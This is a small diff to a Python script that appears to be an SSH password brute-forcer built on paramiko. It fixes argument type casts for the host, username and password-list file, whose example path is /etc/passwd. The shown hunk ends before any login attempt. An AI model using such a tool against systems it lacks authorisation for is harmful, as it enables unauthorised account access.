@@ -3,15 +3,15 @@ import paramiko
 import sys
 
 #argv[1] = host (ex.127.0.0.1)
-host = int(sys.argv[1])
+host = str(sys.argv[1])
 #argv[2] = username (ex.root)
-username = string(sys.argv[2])
+username = str(sys.argv[2])
 attempts = 0
 
 
 #Open file with read permissions 
 # argv[3] = file (ex. /etc/passwd)
-with open(string(sys.argv[3]), "r") as password_list:
+with open(str(sys.argv[3]), "r") as password_list:
   for password in password_list:
     password = password.strip("\n") #Stripping password
     try: 
